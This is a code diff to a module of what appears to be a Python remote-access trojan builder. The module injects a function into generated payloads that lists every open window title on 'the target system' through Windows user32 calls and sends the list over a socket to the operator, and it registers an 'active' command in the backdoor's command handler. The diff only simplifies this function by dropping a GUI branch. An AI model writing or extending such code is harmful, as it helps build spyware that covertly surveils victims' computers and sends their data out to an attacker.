@@ -11,7 +11,7 @@ def main(option):
     if option == 'generate':
         config.import_statements.append('import ctypes')
         config.functions.append('''
-def active(interface):
+def active():
     global IsWindowVisible
     EnumWindows = ctypes.windll.user32.EnumWindows
     EnumWindowsProc = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.POINTER(ctypes.c_int), ctypes.POINTER(ctypes.c_int))
@@ -26,21 +26,16 @@ def active(interface):
             GetWindowText(hwnd, buff, length + 1)
             titles.append(buff.value)
         return True
-    EnumWindows(EnumWindowsProc(foreach_window), 0)
-    if interface == "CUI":
-        encoded = ['\\n   - ' + i.encode('ascii','ignore').decode().strip() for i in titles]
-        encoded = filter(lambda a: a != '\\n   - ', encoded)
-        encoded = list(set(encoded))
-        data = '[+]All opened windows : \\n'
-        data += ''.join(encoded)
-        s.sendall((data + '\\n').encode())
-    elif interface == "GUI":
-        encoded = [i.encode('ascii','ignore').decode().strip() for i in titles]
-        encoded = list(set(encoded))
-        s.sendall(pickle.dumps(encoded))''')
+    EnumWindows(EnumWindowsProc(foreach_window), 0)    
+    encoded = ['\\n   - ' + i.encode('ascii','ignore').decode().strip() for i in titles]
+    encoded = filter(lambda a: a != '\\n   - ', encoded)
+    encoded = list(set(encoded))
+    data = '[+]All opened windows : \\n'
+    data += ''.join(encoded)
+    s.sendall((data + '\\n').encode())''')
         config.logics.append('''
             elif command == "active":
-                active(interface)''')
+                active()''')
         config.help_menu['active'] = 'Shows all open windows on the target system'
     elif option == 'info':
         if interface == "GUI":
